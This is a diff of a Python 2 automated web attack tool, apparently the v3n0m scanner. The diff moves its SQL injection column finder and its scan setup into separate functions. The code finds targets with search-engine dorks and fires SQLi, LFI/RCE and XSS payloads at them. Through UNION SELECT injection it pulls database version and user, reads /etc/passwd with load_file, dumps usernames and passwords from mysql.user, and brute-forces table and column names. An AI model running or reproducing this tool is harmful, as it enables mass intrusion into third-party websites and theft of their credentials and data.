@@ -51,90 +51,11 @@
 
 
 
-
-import re
-import random
-import threading
-import socket
-import urllib2
-import cookielib
-import subprocess
-import codecs
-
-import time
-import sys
-import os
-import math
-import subprocess
-
-
-
-#import statics 
-import itertools
-
-d0rk = [line.strip() for line in open("statics/d0rks", 'r')]
-random.shuffle(d0rk)
-header = [line.strip() for line in open("statics/header", 'r')]
-random.shuffle(header)
-xsses = [line.strip() for line in open("statics/xsses", 'r')]
-random.shuffle(xsses)
-lfis = [line.strip() for line in open("statics/lfi", 'r')]
-random.shuffle(lfis)
-
-sqlerrors = {'MySQL': 'error in your SQL syntax',
-			 'MiscError': 'mysql_fetch',
-			 'MiscError2': 'num_rows',
-			 'Oracle': 'ORA-01756',
-			 'JDBC_CFM': 'Error Executing Database Query',
-			 'JDBC_CFM2': 'SQLServer JDBC Driver',
-			 'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
-			 'MSSQL_Uqm': 'Unclosed quotation mark',
-			 'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
-			 'MS-Access_JETdb': 'Microsoft JET Database',
-			 'Error Occurred While Processing Request': 'Error Occurred While Processing Request',
-			 'Server Error': 'Server Error',
-			 'Microsoft OLE DB Provider for ODBC Drivers error': 'Microsoft OLE DB Provider for ODBC Drivers error',
-			 'Invalid Querystring': 'Invalid Querystring',
-			 'OLE DB Provider for ODBC': 'OLE DB Provider for ODBC',
-			 'VBScript Runtime': 'VBScript Runtime',
-			 'ADODB.Field': 'ADODB.Field',
-			 'BOF or EOF': 'BOF or EOF',
-			 'ADODB.Command': 'ADODB.Command',
-			 'JET Database': 'JET Database',
-			 'mysql_fetch_array()': 'mysql_fetch_array()',
-			 'Syntax error': 'Syntax error',
-			 'mysql_numrows()': 'mysql_numrows()',
-			 'GetArray()': 'GetArray()',
-			 'FetchRow()': 'FetchRow()',
-			 'Input string was not in a correct format': 'Input string was not in a correct format'}
-
-#Multithreading implementation and queueing prepared and ready, Debug support required for stability and testing
-#if __debug__:  
-#   import threading as parcomp  
-#   queueclass=Queue.Queue  
-#   workerclass=threading.Thread  
-#   NUMWORKERS=1  
-#else:  
-#   import multiprocessing as parcomp  
-#   queueclass=parcomp.Queue  
-#   workerclass=parcomp.Process  
-#   NUMWORKERS=parcomp.cpu_count()  
-
-
-#This is the MBCS Encoding Bypass for making MBCS encodings work on Linux - NovaCygni
 try:
-	codecs.lookup('mbcs')
-except LookupError:
-	ascii = codecs.lookup('latin-1')
-	func = lambda name, enc=ascii: {True: enc}.get(name == 'mbcs')
-	codecs.register(func)
-
-# Colours
-W = "\033[0m"
-R = "\033[31m"
-G = "\033[32m"
-O = "\033[33m"
-B = "\033[34m"
+	import re, random, threading, socket, urllib2, cookielib, subprocess, codecs, signal, time, sys, os, math, itertools
+except:
+	print " please make sure you have all of the following modules: re, random, threading, socket, urllib2, cookielib, subprocess, codecs, signal, time, sys, os, math, itertools"
+	exit()
 
 # Banner
 def logo():
@@ -152,37 +73,9 @@ def logo():
 	print "|    													        |"
 	print "|----------------------------------------------------------------|\n"
 
-
-if sys.platform == 'linux' or sys.platform == 'linux2':
-	subprocess.call("clear", shell=True)
-	logo()
-
-
-else:
-	subprocess.call("cls", shell=True)
-	logo()
-
-lfi_log = "v3n0m-lfi.txt"
-lfi_log_file = open(lfi_log, "a")
-rce_log = "v3n0m-rce.txt"
-rce_log_file = open(rce_log, "a")
-xss_log = "v3n0m-xss.txt"
-xss_log_file = open(xss_log, "a")
-admin_log = "v3n0m-admin.txt"
-admin_log_file = open(admin_log, "a")
-
-arg_end = "--"
-arg_eva = "+"
-colMax = 60 # Change this at your will
-gets = 0
-file = "/etc/passwd"
-threads = []
-darkurl = []
-vuln = []
-col = []
-timeout = 75
-socket.setdefaulttimeout(timeout)
-
+def killpid(signum = 0, frame = 0):
+	print "\r\x1b[K"
+	os.kill(os.getpid(), 9)
 
 def search(maxc):
 	urls = []
@@ -475,60 +368,193 @@ def xsstest():
 			threads.append(thread)
 		for thread in threads:
 			thread.join()
+			
+def colfinder():
+	print B + "\n[+] Preparing for Column Finder ..."
+	print "[+] Can take a while ..."
+	print "[!] Working ..."
+	# Thanks rsauron for schemafuzz
+	for host in col:
+		print R + "\n[+] Target: ", O + host
+		print R + "[+] Attempting to find the number of columns ..."
+		print "[+] Testing: ",
+		checkfor = []
+		host = host.rsplit("'", 1)[0]
+		sitenew = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva
+		makepretty = ""
+		for x in xrange(0, colMax):
+			try:
+				sys.stdout.write("%s," % x)
+				sys.stdout.flush()
+				darkc0de = "dark" + str(x) + "c0de"
+				checkfor.append(darkc0de)
+				if x > 0:
+					sitenew += ","
+				sitenew += "0x" + darkc0de.encode("hex")
+				finalurl = sitenew + arg_end
+				gets += 1
+				source = urllib2.urlopen(finalurl).read()
+				for y in checkfor:
+					colFound = re.findall(y, source)
+					if len(colFound) >= 1:
+						print "\n[+] Column length is:", len(checkfor)
+						nullcol = re.findall("\d+", y)
+						print "[+] Found null column at column #:", nullcol[0]
+						for z in xrange(0, len(checkfor)):
+							if z > 0:
+								makepretty += ","
+							makepretty += str(z)
+						site = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva + makepretty
+						print "[+] SQLi URL:", site + arg_end
+						site = site.replace("," + nullcol[0] + ",", ",darkc0de,")
+						site = site.replace(arg_eva + nullcol[0] + ",", arg_eva + "darkc0de,")
 
+						site = site.replace("," + nullcol[0], ",darkc0de")
+						print "[+] darkc0de URL:", site
+						darkurl.append(site)
 
+						print "[-] Done!\n"
+						break
 
+			except(KeyboardInterrupt, SystemExit):
+				raise
+			except:
+				pass
 
-Scanner = 1
-menu = True
-while True:
-	if Scanner == 1:
-		threads = []
-		finallist = []
-		vuln = []
-		col = []
-		darkurl = []
+		print "\n[!] Sorry column length could not be found\n"
+	###########
 
-		print W
-		sites = raw_input("\nChoose your target(domain)   : ")
-		sitearray = [sites]
+	print B + "\n[+] Gathering MySQL Server Configuration..."
+	for site in darkurl:
+		head_URL = site.replace("evilzone",
+								"concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)") + arg_end
+		print R + "\n[+] Target:", O + site
+		while 1:
+			try:
+				gets += 1
+				source = urllib2.urlopen(head_URL).read()
+				match = re.findall("\x1e\x1e\S+", source)
+				if len(match) >= 1:
+					match = match[0][2:].split("\x1e")
+					version = match[0]
+					user = match[1]
+					database = match[2]
+					print W + "\n\tDatabase:", database
+					print "\tUser:", user
+					print "\tVersion:", version
+					version = version[0]
 
-		go = []
+					load = site.replace("evilzone", "load_file(0x2f6574632f706173737764)")
+					source = urllib2.urlopen(load).read()
+					if re.findall("root:x", source):
+						load = site.replace("evilzone", "concat_ws(char(58),load_file(0x" + file.encode(
+							"hex") + "),0x62616c74617a6172)")
+						source = urllib2.urlopen(load).read()
+						search = re.findall("NovaCygni", source)
+						if len(search) > 0:
+							print "\n[!] w00t!w00t!: " + site.replace("evilzone",
+																	  "load_file(0x" + file.encode("hex") + ")")
 
-		dorks = raw_input("Choose the number of random dorks (0 for all.. may take awhile!)   : ")
-		print ""
-		if int(dorks) == 0:
-			i = 0
-			while i < len(d0rk):
-				go.append(d0rk[i])
-				i += 1
-		else:
-			i = 0
-			while i < int(dorks):
-				go.append(d0rk[i])
-				i += 1
-			for g in go:
-				print "dork: ", g
+						load = site.replace("evilzone",
+											"concat_ws(char(58),user,password,0x62616c74617a6172)") + arg_eva + "from" + arg_eva + "mysql.user"
+					source = urllib2.urlopen(load).read()
+					if re.findall("NovaCygni", source):
+						print "\n[!] w00t!w00t!: " + site.replace("evilzone",
+																  "concat_ws(char(58),user,password)") + arg_eva + "from" + arg_eva + "mysql.user"
 
-		numthreads = raw_input('\nEnter no. of threads : ')
-		maxc = raw_input('Enter no. of pages   : ')
-		print "\nNumber of SQL errors :", len(sqlerrors)
-		print "LFI payloads    :", len(lfis)
-		print "XSS payloads    :", len(xsses)
-		print "Headers         :", len(header)
-		print "Threads         :", numthreads
-		print "Dorks           :", len(go)
-		print "Pages           :", maxc
-		print "Timeout         :", timeout
-		print "Search Engines  : 11"
-		print "Encrypted SE    : 3"
-		print ""
-		print ""
-		print ""
+				print W + "\n[+] Number of tables:", len(tables)
+				print "[+] Number of columns:", len(columns)
+				print "[+] Checking for tables and columns..."
+				target = site.replace("evilzone", "0x62616c74617a6172") + arg_eva + "from" + arg_eva + "T"
+				for table in tables:
+					try:
+						target_table = target.replace("T", table)
+						source = urllib2.urlopen(target_table).read()
+						search = re.findall("NovaCygni", source)
+						if len(search) > 0:
+							print "\n[!] Table found: < " + table + " >"
+							print "\n[+] Lets check for columns inside table < " + table + " >"
+							for column in columns:
+								try:
+									source = urllib2.urlopen(target_table.replace("0x62616c74617a6172",
+																				  "concat_ws(char(58),0x62616c74617a6172," + column + ")")).read()
+									search = re.findall("NovaCygni", source)
+									if len(search) > 0:
+										print "\t[!] Column found: < " + column + " >"
+								except(KeyboardInterrupt, SystemExit):
+									raise
+								except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
+									pass
 
-		usearch = search(maxc)
-		Scanner = 0
+							print "\n[-] Done searching inside table < " + table + " > for columns!"
 
+					except(KeyboardInterrupt, SystemExit):
+						raise
+					except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
+						pass
+				print "[!] Fuzzing is finished!"
+				break
+			except(KeyboardInterrupt, SystemExit):
+
+				raise
+
+def fscan():
+	global maxc
+	global usearch
+	global numthreads
+	global threads
+	global finallist
+	global vuln
+	global col
+	global darkurl
+	global sitearray
+	global go
+	
+	threads = []
+	finallist = []
+	vuln = []
+	col = []
+	darkurl = []
+	go = []
+
+	print W
+	sites = raw_input("\nChoose your target(domain)   : ")
+	sitearray = [sites]
+
+	dorks = raw_input("Choose the number of random dorks (0 for all.. may take awhile!)   : ")
+	print ""
+	if int(dorks) == 0:
+		i = 0
+		while i < len(d0rk):
+			go.append(d0rk[i])
+			i += 1
+	else:
+		i = 0
+		while i < int(dorks):
+			go.append(d0rk[i])
+			i += 1
+		for g in go:
+			print "dork: ", g
+	
+	numthreads = raw_input('\nEnter no. of threads : ')
+	maxc = raw_input('Enter no. of pages   : ')
+	print "\nNumber of SQL errors :", len(sqlerrors)
+	print "LFI payloads    :", len(lfis)
+	print "XSS payloads    :", len(xsses)
+	print "Headers         :", len(header)
+	print "Threads         :", numthreads
+	print "Dorks           :", len(go)
+	print "Pages           :", maxc
+	print "Timeout         :", timeout
+	print "Search Engines  : 11"
+	print "Encrypted SE    : 3"
+	print ""
+	print ""
+	print ""
+	
+	usearch = search(maxc)
+
+def fmenu():		
 	print R + "\n[1] SQLi Testing"
 	print "[2] SQLi Testing Auto Mode"
 	print "[3] LFI - RCE Testing"
@@ -549,131 +575,7 @@ while True:
 
 	if chce == '2':
 		injtest()
-		print B + "\n[+] Preparing for Column Finder ..."
-		print "[+] Can take a while ..."
-		print "[!] Working ..."
-		# Thanks rsauron for schemafuzz
-		for host in col:
-			print R + "\n[+] Target: ", O + host
-			print R + "[+] Attempting to find the number of columns ..."
-			print "[+] Testing: ",
-			checkfor = []
-			host = host.rsplit("'", 1)[0]
-			sitenew = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva
-			makepretty = ""
-			for x in xrange(0, colMax):
-				try:
-					sys.stdout.write("%s," % x)
-					sys.stdout.flush()
-					darkc0de = "dark" + str(x) + "c0de"
-					checkfor.append(darkc0de)
-					if x > 0:
-						sitenew += ","
-					sitenew += "0x" + darkc0de.encode("hex")
-					finalurl = sitenew + arg_end
-					gets += 1
-					source = urllib2.urlopen(finalurl).read()
-					for y in checkfor:
-						colFound = re.findall(y, source)
-						if len(colFound) >= 1:
-							print "\n[+] Column length is:", len(checkfor)
-							nullcol = re.findall("\d+", y)
-							print "[+] Found null column at column #:", nullcol[0]
-							for z in xrange(0, len(checkfor)):
-								if z > 0:
-									makepretty += ","
-								makepretty += str(z)
-							site = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva + makepretty
-							print "[+] SQLi URL:", site + arg_end
-							site = site.replace("," + nullcol[0] + ",", ",darkc0de,")
-							site = site.replace(arg_eva + nullcol[0] + ",", arg_eva + "darkc0de,")
-							site = site.replace("," + nullcol[0], ",darkc0de")
-							print "[+] darkc0de URL:", site
-							darkurl.append(site)
-
-							print "[-] Done!\n"
-							break
-
-				except(KeyboardInterrupt, SystemExit):
-					raise
-				except:
-					pass
-
-			print "\n[!] Sorry column length could not be found\n"
-		###########
-
-		print B + "\n[+] Gathering MySQL Server Configuration..."
-		for site in darkurl:
-			head_URL = site.replace("evilzone",
-									"concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)") + arg_end
-			print R + "\n[+] Target:", O + site
-			while 1:
-				try:
-					gets += 1
-					source = urllib2.urlopen(head_URL).read()
-					match = re.findall("\x1e\x1e\S+", source)
-					if len(match) >= 1:
-						match = match[0][2:].split("\x1e")
-						version = match[0]
-						user = match[1]
-						database = match[2]
-						print W + "\n\tDatabase:", database
-						print "\tUser:", user
-						print "\tVersion:", version
-						version = version[0]
-
-						load = site.replace("evilzone", "load_file(0x2f6574632f706173737764)")
-						source = urllib2.urlopen(load).read()
-						if re.findall("root:x", source):
-							load = site.replace("evilzone", "concat_ws(char(58),load_file(0x" + file.encode(
-								"hex") + "),0x62616c74617a6172)")
-							source = urllib2.urlopen(load).read()
-							search = re.findall("NovaCygni", source)
-							if len(search) > 0:
-								print "\n[!] w00t!w00t!: " + site.replace("evilzone",
-																		  "load_file(0x" + file.encode("hex") + ")")
-
-							load = site.replace("evilzone",
-												"concat_ws(char(58),user,password,0x62616c74617a6172)") + arg_eva + "from" + arg_eva + "mysql.user"
-						source = urllib2.urlopen(load).read()
-						if re.findall("NovaCygni", source):
-							print "\n[!] w00t!w00t!: " + site.replace("evilzone",
-																	  "concat_ws(char(58),user,password)") + arg_eva + "from" + arg_eva + "mysql.user"
-
-					print W + "\n[+] Number of tables:", len(tables)
-					print "[+] Number of columns:", len(columns)
-					print "[+] Checking for tables and columns..."
-					target = site.replace("evilzone", "0x62616c74617a6172") + arg_eva + "from" + arg_eva + "T"
-					for table in tables:
-						try:
-							target_table = target.replace("T", table)
-							source = urllib2.urlopen(target_table).read()
-							search = re.findall("NovaCygni", source)
-							if len(search) > 0:
-								print "\n[!] Table found: < " + table + " >"
-								print "\n[+] Lets check for columns inside table < " + table + " >"
-								for column in columns:
-									try:
-										source = urllib2.urlopen(target_table.replace("0x62616c74617a6172",
-																					  "concat_ws(char(58),0x62616c74617a6172," + column + ")")).read()
-										search = re.findall("NovaCygni", source)
-										if len(search) > 0:
-											print "\t[!] Column found: < " + column + " >"
-									except(KeyboardInterrupt, SystemExit):
-										raise
-									except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
-										pass
-
-								print "\n[-] Done searching inside table < " + table + " > for columns!"
-
-						except(KeyboardInterrupt, SystemExit):
-							raise
-						except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
-							pass
-					print "[!] Fuzzing is finished!"
-					break
-				except(KeyboardInterrupt, SystemExit):
-					raise
+		colfinder()
 
 	if chce == '3':
 		lfitest()
@@ -718,11 +620,11 @@ while True:
 		print B + "\nVuln found ", len(vuln)
 
 	if chce == '12':
-		Scanner = 1
 		print W + ""
+		fscan()
 
 	if chce == '13':
-		afsite = raw_input("Enter the site: ")
+		afsite = raw_input("Enter the site eg target.com: ")
 		print B
 		pwd = os.path.dirname(str(os.path.realpath(__file__)))
 		findadmin = subprocess.Popen(pwd + "/modules/adminfinder.py -w modules/adminlist.txt -u " + str(afsite), shell=True)
@@ -733,3 +635,101 @@ while True:
 		mnu = False
 		print W
 		sys.exit(0)
+
+signal.signal(signal.SIGINT, killpid)
+d0rk = [line.strip() for line in open("statics/d0rks", 'r')]
+random.shuffle(d0rk)
+header = [line.strip() for line in open("statics/header", 'r')]
+random.shuffle(header)
+xsses = [line.strip() for line in open("statics/xsses", 'r')]
+random.shuffle(xsses)
+lfis = [line.strip() for line in open("statics/lfi", 'r')]
+random.shuffle(lfis)
+
+sqlerrors = {'MySQL': 'error in your SQL syntax',
+			 'MiscError': 'mysql_fetch',
+			 'MiscError2': 'num_rows',
+			 'Oracle': 'ORA-01756',
+			 'JDBC_CFM': 'Error Executing Database Query',
+			 'JDBC_CFM2': 'SQLServer JDBC Driver',
+			 'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
+			 'MSSQL_Uqm': 'Unclosed quotation mark',
+			 'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
+			 'MS-Access_JETdb': 'Microsoft JET Database',
+			 'Error Occurred While Processing Request': 'Error Occurred While Processing Request',
+			 'Server Error': 'Server Error',
+			 'Microsoft OLE DB Provider for ODBC Drivers error': 'Microsoft OLE DB Provider for ODBC Drivers error',
+
+			 'Invalid Querystring': 'Invalid Querystring',
+			 'OLE DB Provider for ODBC': 'OLE DB Provider for ODBC',
+			 'VBScript Runtime': 'VBScript Runtime',
+			 'ADODB.Field': 'ADODB.Field',
+			 'BOF or EOF': 'BOF or EOF',
+			 'ADODB.Command': 'ADODB.Command',
+			 'JET Database': 'JET Database',
+			 'mysql_fetch_array()': 'mysql_fetch_array()',
+			 'Syntax error': 'Syntax error',
+			 'mysql_numrows()': 'mysql_numrows()',
+			 'GetArray()': 'GetArray()',
+			 'FetchRow()': 'FetchRow()',
+			 'Input string was not in a correct format': 'Input string was not in a correct format'}
+
+#Multithreading implementation and queueing prepared and ready, Debug support required for stability and testing
+#if __debug__:  
+#   import threading as parcomp  
+#   queueclass=Queue.Queue  
+#   workerclass=threading.Thread  
+#   NUMWORKERS=1  
+#else:  
+#   import multiprocessing as parcomp  
+#   queueclass=parcomp.Queue  
+#   workerclass=parcomp.Process  
+#   NUMWORKERS=parcomp.cpu_count()  
+
+#This is the MBCS Encoding Bypass for making MBCS encodings work on Linux - NovaCygni
+try:
+	codecs.lookup('mbcs')
+except LookupError:
+	ascii = codecs.lookup('latin-1')
+	func = lambda name, enc=ascii: {True: enc}.get(name == 'mbcs')
+	codecs.register(func)
+
+# Colours
+W = "\033[0m"
+R = "\033[31m"
+G = "\033[32m"
+O = "\033[33m"
+B = "\033[34m"
+
+if sys.platform == 'linux' or sys.platform == 'linux2':
+	subprocess.call("clear", shell=True)
+	logo()
+else:
+	subprocess.call("cls", shell=True)
+	logo()
+
+lfi_log = "v3n0m-lfi.txt"
+lfi_log_file = open(lfi_log, "a")
+rce_log = "v3n0m-rce.txt"
+rce_log_file = open(rce_log, "a")
+xss_log = "v3n0m-xss.txt"
+xss_log_file = open(xss_log, "a")
+admin_log = "v3n0m-admin.txt"
+admin_log_file = open(admin_log, "a")
+
+arg_end = "--"
+arg_eva = "+"
+colMax = 60 # Change this at your will
+gets = 0
+file = "/etc/passwd"
+threads = []
+darkurl = []
+vuln = []
+col = []
+timeout = 75
+socket.setdefaulttimeout(timeout)
+menu = True
+fscan()
+
+while True:
+	fmenu()
